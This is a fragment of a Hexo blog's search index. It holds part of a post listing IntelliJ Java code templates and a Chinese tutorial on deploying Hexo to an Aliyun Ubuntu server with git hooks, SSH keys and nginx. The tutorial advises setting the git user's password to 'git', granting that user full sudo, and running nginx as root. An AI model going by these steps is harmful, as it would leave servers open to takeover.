String.format(&quot;abc&quot; )
</code></pre>
<h1 id="itli"><a href="#itli" class="headerlink" title="itli"></a>itli</h1><pre><code>    //生成for循环
 for (int i = 0; i &lt; list.size(); i++) &#123;
    String s =  list.get(i);
 &#125;
</code></pre>
<h1 id="itco"><a href="#itco" class="headerlink" title="itco"></a>itco</h1><pre><code>   /// 生成Collection迭代器
 for (Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext(); ) &#123;
     String next =  iterator.next();   
 &#125;
</code></pre>
<h1 id="iter"><a href="#iter" class="headerlink" title="iter"></a>iter</h1><pre><code>   ///生成增强for循环
 for (String s : list) &#123;       
 &#125;
</code></pre>
<h1 id="iten"><a href="#iten" class="headerlink" title="iten"></a>iten</h1><pre><code>    ///生成 enumeration遍历
 while (enumeration.hasMoreElements()) &#123;
    Object nextElement =  enumeration.nextElement();   
 &#125;
</code></pre>
<h1 id="itar"><a href="#itar" class="headerlink" title="itar"></a>itar</h1><pre><code>    ///生成数组for循环
 int[] array = &#123;12345&#125;;
 for (int i = 0; i &lt; array.length; i++) &#123;
    int i1 = array[i]; 
 &#125;
</code></pre>
<h1 id="itit"><a href="#itit" class="headerlink" title="itit"></a>itit</h1><pre><code>  ///生成迭代器 iterator
 Iterator iterator = list.iterator();
 while (iterator.hasNext()) &#123;
    Object next =  iterator.next();
 &#125;
</code></pre>
<h1 id="ittok"><a href="#ittok" class="headerlink" title="ittok"></a>ittok</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   //ittok  生成String token遍历</span><br><span class="line">for (StringTokenizer stringTokenizer = new StringTokenizer(APP_NAME); stringTokenizer.hasMoreTokens(); ) &#123;</span><br><span class="line">   String s = stringTokenizer.nextToken();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="itws"><a href="#itws" class="headerlink" title="itws"></a>itws</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成Axis2 web service调用</span><br><span class="line">try &#123;</span><br><span class="line">    MyServiceLocator locator = new MyServiceLocator();</span><br><span class="line">    Activator service = locator.get();</span><br><span class="line">    // If authorization is required</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setUsername(&quot;user3&quot;);</span><br><span class="line">    //((MyService_Soap_BindingStub)service).setPassword(&quot;pass3&quot;);</span><br><span class="line">    // invoke business method</span><br><span class="line">    service.businessMethod();</span><br><span class="line">&#125; catch (javax.xml.rpc.ServiceException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125; catch (java.rmi.RemoteException ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="try-如-”abc”-try"><a href="#try-如-”abc”-try" class="headerlink" title="try 如:”abc”.try"></a>try 如:”abc”.try</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/// 生成try.....catch</span><br><span class="line">     try &#123;</span><br><span class="line">         &quot;abc&quot;</span><br><span class="line">     &#125; catch (Exception e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h1 id="ifn"><a href="#ifn" class="headerlink" title="ifn"></a>ifn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否为空  </span><br><span class="line">  if (list == null) &#123;</span><br><span class="line">  &#125;2</span><br></pre></td></tr></table></figure>

<h1 id="inn"><a href="#inn" class="headerlink" title="inn"></a>inn</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成判断是否不为空  </span><br><span class="line"> if (list != null) &#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="fori"><a href="#fori" class="headerlink" title="fori"></a>fori</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成简单for循环</span><br><span class="line">  for (int i = 0; i &lt; ; i++) &#123; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h1 id="inst"><a href="#inst" class="headerlink" title="inst"></a>inst</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成是否是该对象引用</span><br><span class="line"> if (list instanceof Object) &#123;</span><br><span class="line">      Object o = (Object) list; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="psf"><a href="#psf" class="headerlink" title="psf"></a>psf</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的</span><br><span class="line"> public static final</span><br></pre></td></tr></table></figure>

<h1 id="psfi"><a href="#psfi" class="headerlink" title="psfi"></a>psfi</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 int</span><br><span class="line"> public static final int </span><br></pre></td></tr></table></figure>

<h1 id="psfs"><a href="#psfs" class="headerlink" title="psfs"></a>psfs</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">///生成 共有 静态最终的 String</span><br><span class="line"> public static final String </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>语言学习总结</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo部署到阿里云服务器</title>
    <url>/bolg/hexo%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>域名还没下来，就先用gitee，但是先记录一下自己hexo部署过程o(<em>￣▽￣</em>)o</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>这里说一下vim的基本操作方便不会的同学进行搭建<br>i–&gt;编辑<br>按一下ESC输入:wq–&gt;保存并退出（冒号也要输入啊！）<br>按一下ESC输入:!wq–&gt;保存并强制退出</p>
</blockquote>
<h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ul>
<li>本地hexo构建可运行发布</li>
<li>阿里云服务器能访问</li>
<li>有一个域名(非必须项，可以公网ip查看嘛~)</li>
<li>Xshell和Xftp且已连接至服务器（怎么连接自行百度，这里就不做过多讲解）</li>
</ul>
<h3 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h3><ul>
<li>Ubantu 20.04</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li>回顾一下Hexo发布到gitee（Pages）的流程：</li>
<li>本地计算机用Hexo构建静态文件public</li>
<li>关键一步就是git上传github或gitee</li>
<li>发布Pages将仓库目录<a href="https://gitee.com/cungudafa/cungudafa/index.html%E6%8B%89%E5%8F%96%E5%88%B0https://cungudafa.gitee.io/index.html">https://gitee.com/cungudafa/cungudafa/index.html拉取到https://cungudafa.gitee.io/index.html</a></li>
</ul>
<p><img src="https://s3.ax1x.com/2020/12/06/DXOrtg.png"><br>当然我们需要上传的是public文件夹；每次xftp手动上传肯定是不现实且麻烦的，所以我们接下来要在服务器安装git。</p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务器创建服务器创建git用户"><a href="#服务器创建服务器创建git用户" class="headerlink" title="服务器创建服务器创建git用户"></a>服务器创建服务器创建git用户</h3><h4 id="创建一个git用户，用来运行git服务。（root不安全）"><a href="#创建一个git用户，用来运行git服务。（root不安全）" class="headerlink" title="创建一个git用户，用来运行git服务。（root不安全）"></a>创建一个git用户，用来运行git服务。（root不安全）</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd git -m</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：Ubantu下必须加上-m，才会自动新建用户目录&#x2F;home&#x2F;git&#x2F;（后面配置和博客文件都放在这里）<br>在&#x2F;home&#x2F;git&#x2F;非常重要，如果出错，可以删除sudo userdel -r git用户，重新之前的步骤。</p>
</blockquote>
<h4 id="设置密码"><a href="#设置密码" class="headerlink" title="设置密码"></a>设置密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<p>密码就是git吧，简单为上。</p>
<h4 id="增加git用户执行sudo的权限"><a href="#增加git用户执行sudo的权限" class="headerlink" title="增加git用户执行sudo的权限"></a>增加git用户执行sudo的权限</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
<p>找到以下内容：root ALL&#x3D;(ALL) ALL在下面添加一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
<p>保存退出后改回权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure>

<h3 id="服务器打开RSA认证"><a href="#服务器打开RSA认证" class="headerlink" title="服务器打开RSA认证"></a>服务器打开RSA认证</h3><p>RSA用公钥加密，私钥解密，成为加密通信。<br>用私钥加密，公钥解密，就是认证。（这样就能证明消息是你发出的。）<br>因为：公钥大家都有，私钥就只有一个，在你自己手里。<br><img src="https://s3.ax1x.com/2020/12/06/DXzRTP.png"></p>
<h4 id="开启认证配置"><a href="#开启认证配置" class="headerlink" title="开启认证配置"></a>开启认证配置</h4><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<p>在sshd_config中开启以下几项：(前两项yes，后一项修改为如下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>重启sshd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop sshd.service</span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>
<h4 id="建立ssh信任关系"><a href="#建立ssh信任关系" class="headerlink" title="建立ssh信任关系"></a>建立ssh信任关系</h4><p>本地电脑生成秘钥对-&gt;发送公钥到服务器-&gt;本地可免密连接服务器</p>
<h5 id="在本地电脑-生成密钥对"><a href="#在本地电脑-生成密钥对" class="headerlink" title="在本地电脑:生成密钥对"></a>在本地电脑:生成密钥对</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot; </span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjSY9S.png"><br>成功后，会在c盘用户下新建秘钥对：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjSrNV.png"></p>
<h5 id="在服务器-切换至git用户，创建-x2F-ssh-文件夹"><a href="#在服务器-切换至git用户，创建-x2F-ssh-文件夹" class="headerlink" title="在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹"></a>在服务器:切换至git用户，创建 ~&#x2F;.ssh 文件夹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br></pre></td></tr></table></figure>
<p>或者root用户直接创建：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>

<h5 id="在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys"><a href="#在本地电脑-发送公钥-id-rsa-pub-到-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys" class="headerlink" title="在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys"></a>在本地电脑:发送公钥 id_rsa.pub 到 &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i C:/Users/CUNGU/.ssh/id_rsa.pub git@47.93.50.90 //把公钥发送给服务器</span><br><span class="line">ssh git@47.93.50.90 // 测试能否登录</span><br></pre></td></tr></table></figure>
<p>服务器文件夹也有了公钥：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpPgg.png"></p>
<h5 id="文件夹权限调整：authorzied-keys权限为600时才生效"><a href="#文件夹权限调整：authorzied-keys权限为600时才生效" class="headerlink" title="文件夹权限调整：authorzied_keys权限为600时才生效"></a>文件夹权限调整：authorzied_keys权限为600时才生效</h5><p>git用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorzied_keys</span><br></pre></td></tr></table></figure>
<p>第二步没有成功，说我没有权限（Permission denied）；emmm，root设置好了</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpK8U.png"><br>root设置第二步：(注意在.ssh目录下)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit // 退出到 root 登录</span><br><span class="line">sudo chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Djp2Pf.png"><br>现在就搭建好git桥梁，为后面实现hexo d部署时，可以自动上传啦！</p>
<h3 id="创建blog-git空仓库"><a href="#创建blog-git空仓库" class="headerlink" title="创建blog.git空仓库"></a>创建blog.git空仓库</h3><h4 id="切换到git用户，接下来都是在git用户权限下进行操作："><a href="#切换到git用户，接下来都是在git用户权限下进行操作：" class="headerlink" title="切换到git用户，接下来都是在git用户权限下进行操作："></a>切换到git用户，接下来都是在git用户权限下进行操作：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git                //切换git用户</span><br><span class="line">cd /home/git/</span><br><span class="line">mkdir -p projects/blog  //创建你的博客目录</span><br><span class="line">mkdir repos &amp;&amp; cd repos</span><br><span class="line">git init --bare blog.git  //创建一个空仓库</span><br><span class="line">cd blog.git/hooks</span><br><span class="line">vi post-receive  //创建hook钩子函数，输入以下内容</span><br><span class="line">git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f</span><br><span class="line">chmod +x post-receive  // 修改钩子函数权限</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj98SS.png"></p>
<h4 id="改变-hexo-git-目录的拥有者为git用户："><a href="#改变-hexo-git-目录的拥有者为git用户：" class="headerlink" title="改变 hexo.git 目录的拥有者为git用户："></a>改变 hexo.git 目录的拥有者为git用户：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chown -R git:git blog.git</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj9BWT.png"></p>
<h5 id="添加备份目录"><a href="#添加备份目录" class="headerlink" title="添加备份目录"></a>添加备份目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/projects/</span><br><span class="line">mkdir -p tmp/blog</span><br></pre></td></tr></table></figure>
<p>修改钩子的内容：（重点是git clone 克隆到主目录home&#x2F;git&#x2F;projects&#x2F;blog主目录要配置到nginx中去的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">GIT_REPO=/home/git/repos/blog.git    # git仓库</span><br><span class="line">TMP_GIT_CLONE=/home/git/projects/tmp/blog</span><br><span class="line">PUBLIC_WWW=/home/git/projects/blog  # 网站目录</span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br><span class="line">chmod +x post-receive          # 赋予脚本的执行权限</span><br></pre></td></tr></table></figure>
<p>git用户赋权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod +x post-receive</span><br><span class="line">exit // 退出到 root 登录</span><br><span class="line">chown -R git:git /home/git/repos/blog.git // 添加权限</span><br><span class="line">sudo chown git:git -R /home/git/projects/</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjCPmj.png"></p>
<p>蓝色为更新后的上传机制：</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCncF.png"></p>
<p>为了安全起见，我们需要关闭git账号登录shell的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/passwd</span><br></pre></td></tr></table></figure>
<p>找到git账号(一般在最后面)添加：&#x2F;usr&#x2F;bin&#x2F;git-shell</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCl7R.png"></p>
<p>加上git就只能git clone，如需shell操作，撤销&#x2F;usr&#x2F;bin&#x2F;git-shell即可。</p>
<p>####在本地任意一空目录，测试git仓库是否可用（测试步骤，稍后可清除）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@48.53.57.50:/home/git/repos/blog.git</span><br></pre></td></tr></table></figure>

<p>实际拉下来的是你的&#x2F;home&#x2F;git&#x2F;projects&#x2F;blog，哈哈哈还是空的~</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjC3A1.png"></p>
<h3 id="hexo配置"><a href="#hexo配置" class="headerlink" title="hexo配置"></a>hexo配置</h3><p>修改博客根目录配置_config.yml，部署部分，增添repo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  message: update</span><br><span class="line">  gitee: https://gitee.com/cungudafa/cungudafa.git</span><br><span class="line">  repo: git@48.53.57.50:/home/git/repos/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<blockquote>
<p>只有在ssh秘钥配置成功，才能成功上传。如果需要修改公钥，要打开git操作shell的权限哦！vim &#x2F;etc&#x2F;passwd最后一句。及时开，及时关，做到万无一失。</p>
</blockquote>
<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><ul>
<li>到这里，我发现一个问题，用源码安装和sudo apt install nginx安装，文件结构是不同的</li>
<li>这里我选择的是sudo apt install nginx的方式安装<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
<p>修改用户为root用户</p>
<p><img src="https://s3.ax1x.com/2020/12/06/Dji6Og.png"></p>
<p>1.端口号（阿里云控制台安全组规则要打开端口哦）<br>2.修改域名<br>3.修改根目录位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/06/DjFPne.png"></p>
<blockquote>
<p>到这里只要重启nginx就可以了，但是我没发现sbin文件，就从进程重启了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -HUP 进程号</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjF69x.png"></p>
<p>接下来就可以用域名或者公网IP访问了</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>博客搭建</tag>
      </tags>
  </entry>
</search>
